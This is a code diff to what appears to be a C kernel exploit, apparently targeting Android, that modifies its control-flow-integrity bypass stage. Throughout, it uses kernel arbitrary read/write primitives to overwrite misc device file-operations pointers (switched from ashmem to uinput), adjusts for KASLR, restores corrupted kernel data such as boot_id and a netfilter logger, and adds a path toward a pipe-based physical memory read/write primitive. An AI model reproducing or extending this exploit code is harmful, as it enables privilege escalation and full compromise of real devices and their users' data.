@@ -1,6 +1,10 @@
 #include "common.h"
 
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+#define PSELECT_CFI_ROUTE_ATTEMPTS 4
+#else
 #define PSELECT_CFI_ROUTE_ATTEMPTS 1
+#endif
 
 atomic_int cfi_stage_done;
 ssize_t cfi_write_ret = -1;
@@ -30,7 +34,14 @@ static int route_delay_usec(int attempt) {
     errno = 0;
     long value = strtol(forced, &end, 0);
     if (!errno && end != forced && !*end && value >= 0 && value <= 1000000) {
+#if defined(APP_PAYLOAD) && APP_PAYLOAD
+      static const int offsets[] = {0, 5000, 0, 5000};
+      size_t index = (size_t)(attempt - 1) %
+                     (sizeof(offsets) / sizeof(offsets[0]));
+      return (int)value + offsets[index];
+#else
       return (int)value;
+#endif
     }
   }
   static const int delays[] = {
@@ -184,15 +195,16 @@ int repair_fake_fops_llseek(int fd) {
 }
 
 int restore_slide_boot_id(int fd) {
-  uintptr_t boot_id_data = SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
+  uintptr_t boot_id_data_ptr =
+      SLIDE_RANDOM_BOOT_ID_DATA + slide_p0_offset;
   slide_bootid_want = slide_canon_addr(SLIDE_SYSCTL_BOOTID);
   configfs_read_once(
-      fd, boot_id_data, &slide_bootid_before, sizeof(slide_bootid_before));
+      fd, boot_id_data_ptr, &slide_bootid_before, sizeof(slide_bootid_before));
   slide_bootid_restore_ret =
     configfs_write_once(
-        fd, boot_id_data, &slide_bootid_want, sizeof(slide_bootid_want));
+        fd, boot_id_data_ptr, &slide_bootid_want, sizeof(slide_bootid_want));
   configfs_read_once(
-      fd, boot_id_data, &slide_bootid_after, sizeof(slide_bootid_after));
+      fd, boot_id_data_ptr, &slide_bootid_after, sizeof(slide_bootid_after));
   pr_info("slide restore boot_id data pid=%d ret=%zd before=%016llx "
           "want=%016llx after=%016llx errno=%d\n",
           getpid(), slide_bootid_restore_ret,
@@ -204,7 +216,7 @@ int restore_slide_boot_id(int fd) {
       slide_bootid_after == slide_bootid_want;
 
 #ifdef SLIDE_RB_PARENT_TYPE_RESTORE
-  uintptr_t parent_type = SLIDE_LOGGERS_0_1 + slide_p0_offset +
+  uintptr_t parent_type = SLIDE_NFULNL_LOGGER + slide_p0_offset +
                           sizeof(uint64_t);
   uint64_t type_before = 0;
   uint64_t type_after = 0;
@@ -243,7 +255,7 @@ int try_cfi_stage(void) {
     return 0;
   }
 
-  uintptr_t misc_fops = data_addr(ASHMEM_MISC_FOPS);
+  uintptr_t misc_fops = data_addr(UINPUT_FOPS);
   uint64_t pre_fops = 0;
   ssize_t pre_rb = configfs_read_once(
       fd, misc_fops, &pre_fops, sizeof(pre_fops));
@@ -292,7 +304,17 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
-  uint64_t original_fops = canon_addr(ASHMEM_FOPS);
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (!restore_p0_oracle_pages(fd)) {
+    cfi_last_step = 10;
+    cfi_last_errno = errno;
+    goto fail;
+  }
+#endif
+
+  uint64_t original_fops = data_addr(UINPUT_FOPS);
+  pr_info("cfi restoring misc_fops target=%016zx value=%016llx\n",
+          misc_fops, (unsigned long long)original_fops);
   ssize_t restore = configfs_write_once(
       fd, misc_fops, &original_fops, sizeof(original_fops));
   cfi_restore_ret = restore;
@@ -311,17 +333,29 @@ int try_cfi_stage(void) {
     goto fail;
   }
 
+#if !defined(APP_PHYS_P0_ORACLE) || !APP_PHYS_P0_ORACLE
   if (!restore_slide_boot_id(fd)) {
     cfi_last_step = 10;
     cfi_last_errno = errno;
     goto fail;
   }
+#endif
 
   if (!kaslr_done) {
     cfi_last_step = 9;
     cfi_last_errno = errno;
     goto fail;
   }
+
+  pr_info("cfi starting pipe physrw\n");
+
+#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
+  if (getenv("P0_ORACLE_DIAG")) {
+    int diagnostic_ok = run_p0_pipe_oracle_diagnostic(fd);
+    fflush(NULL);
+    _exit(diagnostic_ok ? 0 : 1);
+  }
+#endif
 
   int installed = 0;
   pipe_stage_attempts = 0;
@@ -373,7 +407,7 @@ int try_cfi_stage(void) {
 
 fail:
   if (dirty) {
-    uint64_t original_fops_fail = data_addr(ASHMEM_FOPS);
+    uint64_t original_fops_fail = data_addr(UINPUT_FOPS);
     if (kaslr_done) {
       original_fops_fail = canon_addr(ASHMEM_FOPS);
     }
